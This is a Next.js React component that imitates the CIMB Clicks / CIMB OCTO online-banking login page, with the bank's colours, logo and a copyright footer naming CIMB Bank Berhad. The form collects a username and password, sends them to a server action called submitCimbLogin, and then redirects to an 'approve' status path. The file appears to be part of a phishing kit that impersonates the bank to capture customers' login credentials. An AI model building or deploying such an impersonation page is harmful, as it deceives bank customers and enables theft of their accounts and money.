"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Menu, Loader2 } from "lucide-react";
import { submitCimbLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function CimbLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitCimbLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white text-[#333]">
      {/* Header */}
      <header className="flex items-center bg-[#CC0000] px-4 py-3 text-white shadow-md">
        <button className="mr-4">
          <Menu size={28} />
        </button>
        <div className="flex flex-1 items-center justify-center pr-10 text-[18px] font-bold tracking-tight">
          <span>CIMB</span>
          <span className="mx-1 italic font-normal text-white/90">Clicks</span>
          <span className="mx-2 font-light text-white/60">|</span>
          <span>CIMB OCTO</span>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center px-8 py-10">
        <h2 className="mb-10 text-center text-[22px] font-bold text-[#444]">
          Please enter your login credentials
        </h2>

        {/* Logo */}
        <div className="mb-10 flex justify-center">
          <Image
            src="/bank/CIMB_Niaga_logo.svg"
            alt="CIMB Logo"
            width={240}
            height={40}
            className="h-auto w-auto max-w-[200px]"
          />
        </div>

        <form onSubmit={handleLogin} className="w-full max-w-sm space-y-6">
          {error && (
            <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
              {error}
            </div>
          )}

          {/* Username Input */}
          <div className="relative border-b-2 border-[#CC0000]">
            <input
              type="text"
              placeholder="My Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full bg-transparent py-2 text-lg text-gray-700 placeholder:text-gray-400 focus:outline-none"
              required
            />
          </div>

          {/* Password Input */}
          <div className="relative border-b-2 border-[#CC0000]">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-transparent py-2 text-lg text-gray-700 placeholder:text-gray-400 focus:outline-none"
              required
            />
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={isLoading}
            className="flex w-full items-center justify-center rounded bg-[#CC0000] py-3.5 text-xl font-bold text-white shadow-lg transition-transform active:scale-[0.98] disabled:opacity-80"
          >
            {isLoading ? (
              <>
                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                PLEASE WAIT...
              </>
            ) : (
              "LOGIN"
            )}
          </button>

          {/* Links */}
          <div className="space-y-4 pt-2 text-center">
            <div>
              <button
                type="button"
                className="text-[15px] font-medium text-[#666] hover:underline"
              >
                Forgot Login Details??
              </button>
            </div>
            <div>
              <button
                type="button"
                className="text-[18px] font-bold text-[#CC0000] underline underline-offset-4"
              >
                Forgot User ID or Password?
              </button>
            </div>
          </div>

          {/* Business Note */}
          <div className="pt-8 text-center text-[14px] leading-relaxed text-[#666]">
            <p>
              <span className="font-bold">Note:</span> Have a business account with us? Click{" "}
              <span className="cursor-pointer text-[#CC0000] underline">here</span> to find out how to create your Bizchannel@CIMB online banking account.
            </p>
          </div>

          {/* Desktop View */}
          <div className="pt-6 text-center">
            <button
              type="button"
              className="text-[18px] font-bold text-[#444] underline decoration-2 underline-offset-4"
            >
              Desktop View
            </button>
          </div>
        </form>
      </main>

      {/* Footer */}
      <footer className="px-8 pb-10 text-center text-[13px] leading-tight text-gray-400">
        <p>All rights reserved. Copyright © 2026</p>
        <p>CIMB Bank Berhad 197201001799 (13491-P)</p>
      </footer>
    </div>
  );
}
